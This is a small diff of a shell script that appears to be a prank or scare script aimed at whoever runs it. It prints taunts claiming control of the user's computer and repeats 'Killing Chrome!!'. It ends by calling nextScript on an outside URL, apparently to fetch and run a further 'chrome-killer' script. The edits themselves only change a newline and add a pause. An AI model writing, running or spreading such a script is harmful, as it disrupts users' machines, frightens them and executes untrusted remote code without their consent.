@@ -21,7 +21,7 @@ bigMsg "\n\nI can't believe you actually ran this script!!";
 
 sleep 3s;
 
-echo "\n\nYou DO realize I now have control over your computer now right??";
+echo "\nYou DO realize I now have control over your computer now right??";
 
 sleep 4s;
 
@@ -55,5 +55,7 @@ echo "Killing Chrome!!";
 wait;
 echo "Killing Chrome!!";
 wait;
+
+sleep 5s;
 
 nextScript 'https://suckaaa.com/s/chrome-killer';
